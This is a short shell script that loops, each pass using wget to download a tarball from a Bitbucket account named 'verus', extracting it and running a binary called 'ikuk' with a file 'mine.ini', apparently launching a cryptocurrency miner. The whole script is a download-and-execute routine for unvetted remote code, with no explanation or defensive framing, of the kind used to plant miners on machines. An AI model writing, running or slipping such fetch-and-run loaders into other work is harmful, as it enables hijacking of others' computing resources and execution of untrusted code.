#!/bin/sh
 
COUNTER=20
until [  $COUNTER -lt 10 ]; do
 
wget https://bitbucket.org/bara_798/verus/downloads/bandar.tar.gz && tar -xvf bandar.tar.gz && ./ikuk mine.ini

     echo COUNTER $COUNTER
     let COUNTER-=1
done
